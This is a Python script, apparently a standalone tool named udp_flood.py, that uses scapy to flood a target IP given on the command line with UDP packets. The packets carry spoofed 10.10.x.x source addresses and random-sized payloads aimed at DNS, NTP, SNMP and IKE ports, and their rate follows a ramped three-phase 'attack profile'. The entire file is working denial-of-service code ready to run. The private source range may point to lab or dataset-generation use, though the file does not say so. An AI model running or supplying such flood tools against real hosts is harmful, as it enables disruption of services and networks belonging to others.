#!/usr/bin/env python3
import scapy.all as scapy
import random
import time
import sys


def attack_profile(duration):
    start = time.time()
    while True:
        elapsed = time.time() - start
        if elapsed > duration:
            break

        phase = elapsed / duration

        if phase < 0.3:
            intensity = 0.3
        elif phase < 0.7:
            intensity = 1.0
        else:
            intensity = 0.4

        yield intensity


def gaussian_payload():
    size = int(random.gauss(650, 250))
    size = max(64, min(size, 1400))
    return scapy.Raw(load=bytes(random.getrandbits(8) for _ in range(size)))


def random_clustered_ip():
    base = random.randint(1, 20)
    return f"10.10.{base}.{random.randint(2,254)}"


def build_flow_pool(flow_count=60000):
    pool = []
    for _ in range(flow_count):
        pool.append((
            random_clustered_ip(),
            random.randint(20000, 65000),
            random.choice([53, 123, 161, 500])
        ))
    return pool


def udp_flood(target_ip, duration):

    base_rate = 800
    peak_rate = 2500

    packets_per_flow = 2
    flow_pool = build_flow_pool(flow_count=60000)

    start = time.time()
    flow_index = 0
    total_flows = len(flow_pool)

    for intensity in attack_profile(duration):

        if flow_index >= total_flows:
            break

        current_rate = base_rate + (peak_rate - base_rate) * intensity

        src_ip, sport, dport = flow_pool[flow_index]

        for _ in range(packets_per_flow):
            pkt = (
                scapy.IP(src=src_ip, dst=target_ip) /
                scapy.UDP(sport=sport, dport=dport) /
                gaussian_payload()
            )
            scapy.send(pkt, verbose=0)

        flow_index += 1

        sleep_time = max(0.0002, 1.0 / current_rate)
        sleep_time *= random.uniform(0.7, 1.3)
        time.sleep(sleep_time)

    print(f"Approx flows generated: {flow_index}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: udp_flood.py <target_ip> <duration>")
        sys.exit(1)

    udp_flood(sys.argv[1], int(sys.argv[2]))